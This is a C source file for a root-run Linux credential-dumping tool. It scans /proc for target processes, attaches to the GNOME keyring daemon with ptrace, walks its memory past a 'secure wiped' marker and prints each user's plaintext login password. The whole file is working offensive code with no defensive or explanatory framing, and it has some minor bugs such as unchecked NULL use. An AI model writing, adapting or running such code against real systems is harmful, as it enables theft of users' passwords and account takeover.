#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

#include "targets.h"

#define PROC "/proc"

char *getUser(int pid)
{
    char environFile[128] = {0};
    char *var = NULL, *user = NULL, *logname=NULL, *res = NULL;
    size_t size = 0;
    int len=0, i =0, maxLines = 20;
    FILE *fp = NULL;

    snprintf(environFile, 128, "%s/%d/environ", PROC, pid);
    if ( (fp = fopen(environFile, "r")) == NULL )
    {
        printf("  [!] ERROR: Could not fopen - %s\n", strerror(errno));
        goto CLEANUP;
    }
    
    while ( i != maxLines )
    {
        if ( (getdelim(&var, &size, '\0', fp)) < 0 )
        {
            printf("  [!] ERROR: getting line - %s\n", strerror(errno)); 
            goto CLEANUP;
        }
        if ( (user = strstr(var, "USER=")) )
        {
            user += 5; // skip USER=
            len = size-5;
            res = calloc(len+1, 1);
            memcpy(res, user, len);
            break;
        }
        if (var != NULL)
        {
            free(var);
            var = NULL;
        }
        size = 0;
    }

    CLEANUP:
        if ( var != NULL )
            free(var);
        if ( fp != NULL )
            fclose(fp);
        return res;
}

int dumpPasswdKeyring(Target target, int pid)
{
    char passwd[1024] = {0}, *user = NULL;
    unsigned long chunk = 0;
    unsigned long eggAddr = 0;
    unsigned long *egg;
    unsigned long marker = 0;
    int status = -1, loopNum=0, loopMax=4;
    int passwdDone = 0;
    int cur = 0;

    if ( (user = getUser(pid)) == NULL )
    {
        printf("  [!] Error getting user for pid\n");
    }

    if ( !strcmp(user, "lightdm") )
        return 1; // Skip this one to avoid crash

    printf("[+] GNOME KEYRING (%d)\n", pid);

    if ( ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0 )
    {
        printf("  [!] ERROR: Ptrace attach failed - %s\n", strerror(errno));
        return -1;
    }

    wait(&status);
    if ( WIFSTOPPED(status) )
    {
        if ( (eggAddr = ptrace(PTRACE_PEEKDATA, pid, (void*)target.eggPtrAddr, NULL)) < 0 )
        {
            printf(" [!] ERROR: Ptrace peek 1 failed - %s\n", strerror(errno));
            return -1;
        }

        while (1)
        {
            if (loopNum == loopMax)
            {
                printf("  [!] ERROR: Cannot find marker for egg region\n");
                return -1;
            }

            marker = 0;
            if ( (marker = ptrace(PTRACE_PEEKDATA, pid, (void*)eggAddr, NULL)) < 0)
            {
                printf("  [!] ERROR: Ptrace peek marker failed - %s\n", strerror(errno));
                return -1;
            }
            if ( ((marker & 0xff) != 0xaa) && ((marker & 0xff) != 0x00) )
            {
                eggAddr += sizeof(long)*2; // Password starts 2 words after the last "secure wiped" word
                break;
            }
            eggAddr += sizeof(long);
            loopNum += 1;
        }

        loopNum = 0;
        while (!passwdDone)
        {
            if (loopNum == 256)
            {
                printf("  [!] ERROR: Cannot find password\n");
                return -1;
            }
            chunk = 0;
            eggAddr += cur;
  
            if ( (chunk = ptrace(PTRACE_PEEKDATA, pid, (void*)eggAddr, NULL)) < 0)
            {
                printf("  [!] ERROR: Ptrace peek 2 failed - %s\n", strerror(errno));
                return -1;
            }
            memcpy(passwd+cur, &chunk, sizeof(long));
            for (int i=0; i < cur; i++)
            {
                if (passwd[i] == '\0')
                    passwdDone = 1;
            }
            cur += sizeof(long);
            loopNum += 1;
        }
        if ( ptrace(PTRACE_DETACH, pid, NULL, NULL) < 0 )
        {
            printf(" [!] ERROR: Ptrace attach failed\n");
            return -1;
        }
    }

    if (passwd)
    {
        printf("  [-] %s:%s\n", user, passwd);
        return 0;
    }
    else
    {
        return -1;
    }
}

int processTarget(Target target)
{
    DIR *dir = NULL;
    struct dirent* de = 0;
    int pid = -1, ret = -1;
    int result = 0;
    FILE *fp = NULL;
    size_t size = 1024;
    char cmdlineFile[1024] = {0};
    char *taskName = NULL;
    size_t taskSize = 0;

    dir = opendir(PROC);
    if ( dir == NULL )
    {
        printf("[!] ERROR: Failed to open /proc\n");
        return -1;
    }

    while ((de = readdir(dir)) != 0 )
    {
        if ( !strcmp(de->d_name, ".") || !strcmp(de->d_name, ".."))
            continue;

        result = 0;
        result = sscanf(de->d_name, "%d", &pid);

        if ( result != 1)
            continue;
        memset(cmdlineFile, 0, size);
        snprintf(cmdlineFile, size-1, "%s/%d/cmdline", PROC, pid);

        if ( (fp = fopen(cmdlineFile, "r")) == NULL )
            continue; // likley lost the race for a process that just closed

        taskSize = 0;
        if ( getline(&taskName, &taskSize, fp) > 0 )
        {
            if ( strstr(taskName, target.processName) )
            {
                if ( dumpPasswdKeyring(target, pid) < 0 )
                {
                    printf("  [!] ERROR: dumping passwords from keyring\n");
                    goto CLEANUP;
                }
            }
        }
        if (taskName != NULL)
        {
            free(taskName);
            taskName = NULL;
        }

        if ( fp != NULL )
        {
            fclose(fp);
            fp = NULL;
        }
    }

    ret = 0;
    CLEANUP:
         if (taskName != NULL)
        {
            free(taskName);
            taskName = NULL;
        }

        if ( fp != NULL )
        {
            fclose(fp);
            fp = NULL;
        }
        return ret;
}

int main()
{
    size_t numTargets = sizeof(targets)/sizeof(Target);

    if ( getuid() != 0 )
    {
        printf("[!] Must be root!\n");
        return -1;
    }

    for (int i=0; i <numTargets; i++)
    {
        processTarget(targets[i]);
    }
    return 0;
}
